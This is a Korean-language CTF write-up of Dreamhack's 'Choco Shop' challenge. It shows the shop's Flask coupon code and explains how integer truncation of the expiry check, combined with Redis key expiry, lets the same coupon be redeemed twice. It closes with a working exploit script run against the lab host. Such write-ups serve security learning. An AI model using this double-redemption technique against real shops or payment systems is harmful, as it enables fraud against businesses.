
# Choco Shop

Dreamhack의 Choco Shop 문제이다.

![](../assets/img/Pasted%20image%2020240330203616.png)

계정당 하나씩 사용할 수 있는 1000원짜리 쿠폰을 이용해 2000원의 Flag를 구매해야하는데...

![](../assets/img/Pasted%20image%2020240330203622.png)

쿠폰을 발급 받으면 아래처럼 JWT 형식의 문자열이 나온다.

![](../assets/img/Pasted%20image%2020240330203628.png)

쿠폰을 발급받는 코드를 확인해보면

```python
@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'], 'amount': 1000, 'expiration': int(time()) + COUPON_EXPIRATION_DELTA}
    uuid = user['uuid']
    user['coupon_claimed'] = True
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(user))
    return jsonify({'coupon': coupon})
```

`user['coupon_claimed'] = True` 로 설정되어 계정당 한번만 쿠폰을 발급 받을 수 있다.

이번엔 쿠폰을 등록하는 코드를 확인해보면

```python
@app.route('/coupon/submit')
@get_session()
def coupon_submit(user):
    coupon = request.headers.get('coupon', None)
    if coupon is None:
        raise BadRequest('Missing Coupon')

    try:
        coupon = jwt.decode(coupon, JWT_SECRET, algorithms='HS256')
    except:
        raise BadRequest('Invalid coupon')

    if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')

    rate_limit_key = f'RATELIMIT:{user["uuid"]}'
    if r.setnx(rate_limit_key, 1):
        r.expire(rate_limit_key, timedelta(seconds=RATE_LIMIT_DELTA))
    else:
        raise BadRequest(f"Rate limit reached!, You can submit the coupon once every {RATE_LIMIT_DELTA} seconds.")


    used_coupon = f'COUPON:{coupon["uuid"]}'
    if r.setnx(used_coupon, 1):
        # success, we don't need to keep it after expiration time
        if user['uuid'] != coupon['user']:
            raise Unauthorized('You cannot submit others\' coupon!')

        r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
        user['money'] += coupon['amount']
        r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
        return jsonify({'status': 'success'})
    else:
        # double claim, fail
        raise BadRequest('Your coupon is alredy submitted!')
```

다른 계정의 쿠폰은 등록할 수 없게 되어있다.

해당 문제는 쿠폰의 expiration의 시간차를 이용해 같은 쿠폰을 2번 등록할 수 있는 취약점을 이용해야한다.

처음 쿠폰을 발급 받을때 expiration은 int(time()) + COUPON_EXPIRATION_DELTA(45초)로 설정이된다.

쿠폰의 등록은 Redis에서 setnx를 통해 coupon의 uuid를 Key 값으로 등록하여 다음 등록시에 해당 coupon의 uuid가 key값으로 존재하는지 검사한다.

```python
if r.setnx(used_coupon, 1):
        # success, we don't need to keep it after expiration time
        if user['uuid'] != coupon['user']:
            raise Unauthorized('You cannot submit others\' coupon!')

        r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
        user['money'] += coupon['amount']
        r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
        return jsonify({'status': 'success'})
```

등록 후 아래 코드를 통해 Coupon의 uuid Key값을 만료시킨다.
```python
r.expire(used_coupon, timedelta(seconds=coupon['expriation'] - int(time()))
```

만료되는 시간을 보면 coupon의 expiration 시간으로 설정된 쿠폰 발급 당시의 시간 + 45초가 지나면 Redis에 등록된 Coupon uuid의 Key값은 삭제가된다.

쿠폰 등록 과정 중 쿠폰이 만료되었는지 검사하는 코드로 검사를 하지만 int 값으로 변환하기 때문에 소수점의 초는 짤리게된다.

```python
if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')
```

따라서 45.0초 ~ 46초 사이에 등록을 하게 되면 쿠폰의 만료 코드는 통과하고 Redis에서는 Coupon uuid Key값은 삭제가 되어있어 동일한 쿠폰으로 2번 등록할수있다.

해당 기능을하는 코드를 작성하여 플래그를 구입하여 문제를 풀면된다.

```python
ex.py

import time
import requests

base_url = "http://host1.dreamhack.games:20630"
COUPON_EXPIRATION_DELTA = 45

#get session
r = requests.get(base_url+"/session")
res = r.json()
session = res['session']

#get coupon
headers = {'Authorization':session}
r = requests.get(base_url+"/coupon/claim",headers=headers)
res = r.json()
coupon = res['coupon']
print(coupon)

#submit coupon
headers = {'Authorization':session,'coupon':coupon}
r = requests.get(base_url+"/coupon/submit",headers=headers)
print(r.json())

time.sleep(COUPON_EXPIRATION_DELTA)

headers = {'Authorization':session,'coupon':coupon}
r = requests.get(base_url+"/coupon/submit",headers=headers)
print(r.json())

headers = {'Authorization':session}
r = requests.get(base_url+"/flag/claim",headers=headers)
res = r.json()
print(res)
```
